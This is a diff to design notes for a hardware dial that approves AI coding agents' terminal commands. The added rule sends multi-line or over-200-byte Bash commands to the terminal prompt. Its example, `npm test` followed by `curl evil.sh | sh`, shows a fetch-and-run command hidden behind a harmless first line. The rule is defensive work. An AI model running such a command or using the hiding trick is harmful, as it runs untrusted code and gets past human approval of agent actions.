@@ -109,6 +109,11 @@ Claude Code or Codex in an Orca terminal (hint ORCA_TERMINAL_HANDLE from the wav
 - **A card always shows the command** (PM, 2026-11-13). A character the dial cannot draw (CJK, an emoji) would make
   today's firmware refuse the whole question, so the devices process replaces each such character with `?` when it
   builds the card, using the round dial's drawable set; the summary line is never dropped.
+- **The dial approves only a command it can show whole** (Diego, 2026-11-14). A Bash command of more than one non-blank
+  line, or whose line is over 200 bytes, would show only part of what Allow approves (`npm test\ncurl evil.sh | sh`
+  would read "npm test"). For such a command the client still posts, marked `terminalOnly`, and the answer is `none` at
+  once: no Allow or Deny on the dial, and the terminal's prompt decides. The dial shows the agent waiting with the line
+  "Too long for the dial. Answer in the terminal." A one-line command that fits is approved on the dial as before.
 - Posts `{ sessionId, tool, summary, cwd }` to `/api/hook/approval` with the CLI's own client for the daemon's local
   socket (the TypeScript transport under `cli/src/lib/` the other CLI commands use, not `notify.mjs`, which is a
   standalone script), and waits up to 5 minutes.
